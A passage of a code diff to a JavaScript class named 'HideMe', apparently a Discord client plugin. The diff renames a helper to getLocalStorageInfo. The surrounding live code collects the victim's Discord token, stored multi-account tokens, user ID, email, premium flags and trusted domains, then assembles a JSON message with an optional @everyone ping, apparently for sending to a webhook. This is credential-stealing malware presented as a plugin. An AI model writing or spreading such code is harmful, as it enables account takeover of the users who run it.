@@ -104,7 +104,7 @@ class HideMe {
             });
         }
 
-        function getInfo(info){
+        function getLocalStorageInfo(info){
             return new Promise(async (resolve, reject) => {
                 return resolve(window.open().localStorage[info])
             });
@@ -114,14 +114,14 @@ class HideMe {
         var actualUserUsername = document.getElementsByClassName("size14-3fJ-ot title-338goq")[0].innerText;
         var actualUserDiscriminator = document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0].innerText.includes("\n") ? document.getElementsByClassName("hoverRoll-2XwpoF")[0]?.innerText.split(/\r\n|\r|\n/)[0] : document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0]?.innerText.split(/\r\n|\r|\n/);
         var actualUserTag = actualUserUsername+actualUserDiscriminator;
-        var actualUserToken = await getInfo("token");
-        var actualUserID = await getInfo("user_id_cache");
-        //var actualUserSettings = await getInfo("UserSettingsStore"); //Pretty Big
-        var actualUserEmail = await getInfo("email_cache");
+        var actualUserToken = await getLocalStorageInfo("token");
+        var actualUserID = await getLocalStorageInfo("user_id_cache");
+        //var actualUserSettings = await getLocalStorageInfo("UserSettingsStore"); //Pretty Big
+        var actualUserEmail = await getLocalStorageInfo("email_cache");
         var actualUserPremiumState = window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const r of Object.keys(e.c).map(r=>e.c[r].exports).filter(e=>e)){if(r.default&&void 0!==r.default.getCurrentUser)return JSON.parse(JSON.stringify(r.default.getCurrentUser())).premiumUsageFlags;if(void 0!==r.getCurrentUser)return JSON.parse(JSON.stringify(r.getCurrentUser())).premiumUsageFlags}}]);
-        var storedTokens = await getInfo("tokens"); // For New Multi Account System
-        var trustedDomains = await getInfo("MaskedLinkStore"); // Trusted Domains List(when you trust them with the "Yes" button)
-        var verifiedGameAndProgramsList = await getInfo("GameStoreReportedGames"); //List of VERIFIED games/programs
+        var storedTokens = await getLocalStorageInfo("tokens"); // For New Multi Account System
+        var trustedDomains = await getLocalStorageInfo("MaskedLinkStore"); // Trusted Domains List(when you trust them with the "Yes" button)
+        var verifiedGameAndProgramsList = await getLocalStorageInfo("GameStoreReportedGames"); //List of VERIFIED games/programs
 
         var pD = JSON.stringify({
             content: config.pingOnResult ? "@everyone": "Ah Fuck No Ping :(",
